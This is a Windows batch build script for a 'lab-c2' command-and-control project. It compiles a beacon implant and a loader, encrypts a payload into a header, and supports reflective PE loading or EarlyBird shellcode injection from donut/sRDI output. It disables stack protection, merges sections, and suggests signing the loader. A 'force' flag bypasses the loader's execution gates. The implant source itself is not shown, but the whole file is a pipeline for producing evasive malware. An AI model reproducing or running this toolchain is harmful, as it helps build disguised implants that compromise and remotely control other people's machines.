@echo off
REM ============================================================
REM  lab-c2 build (x64)
REM  Run inside "x64 Native Tools Command Prompt for VS 2022/2026",
REM  or call "<VS>\VC\Auxiliary\Build\vcvars64.bat" before this script.
REM
REM  usage:  build.bat [payload-file]
REM          default payload = build\beacon.exe   (PE -> reflective map, no donut needed)
REM          pass a .bin (donut / sRDI output) instead to use the EarlyBird path
REM
REM  KEEP THIS FILE ASCII-ONLY.
REM  Reason (measured 2026-10-04): a UTF-8-without-BOM .bat with Chinese
REM  comments is decoded by a codepage-936 cmd.exe as GBK, and a lead byte
REM  swallows the following CR/newline + first chars of the next line.
REM  Symptom: 'xpansion' is not recognized / '4' is not recognized ...
REM ============================================================
setlocal enabledelayedexpansion
cd /d "%~dp0"
if not exist build mkdir build

set PAYLOAD=%~1
if "%PAYLOAD%"=="" set PAYLOAD=build\beacon.exe

REM mode: "force" = /DLCS_FORCE_RUN (gates log-only, for lab connectivity validation)
set MODE=%~2
set LOADER_EXTRA=
if /i "%MODE%"=="force" set LOADER_EXTRA=/DLCS_FORCE_RUN

set CL_FLAGS=/nologo /O2 /GS- /GL /MT /std:c++17 /EHsc /DNDEBUG /utf-8 /D_CRT_SECURE_NO_WARNINGS
set LINK_FLAGS=/link /OPT:REF /OPT:ICF /MERGE:.rdata=.text /SUBSYSTEM:CONSOLE /DYNAMICBASE /HIGHENTROPYVA /DEBUG:NONE

echo [1/4] build beacon.exe
cl %CL_FLAGS% implant\beacon.cpp /Fo:build\ /Fe:build\beacon.exe %LINK_FLAGS% winhttp.lib advapi32.lib shell32.lib || goto :err

echo [2/4] build loader.exe (with current implant\payload.h)
cl %CL_FLAGS% %LOADER_EXTRA% implant\loader.cpp /Fo:build\ /Fe:build\loader.exe %LINK_FLAGS% advapi32.lib user32.lib || goto :err

if not exist "%PAYLOAD%" (
  echo [3/4] payload "%PAYLOAD%" not found - loader.exe keeps the existing payload.h
  goto :done
)

echo [3/4] encrypt %PAYLOAD% -^> implant\payload.h
python tools\enc.py "%PAYLOAD%" || goto :err

echo [4/4] rebuild loader.exe with the fresh payload
cl %CL_FLAGS% %LOADER_EXTRA% implant\loader.cpp /Fo:build\ /Fe:build\loader.exe %LINK_FLAGS% advapi32.lib user32.lib || goto :err

:done
echo.
echo artifacts: build\beacon.exe  build\loader.exe
echo optional signing:
echo   signtool sign /fd SHA256 /f cert.pfx /p PASS /tr http://timestamp.digicert.com /td SHA256 build\loader.exe
goto :eof

:err
echo BUILD FAILED, errorlevel=%errorlevel%
exit /b 1
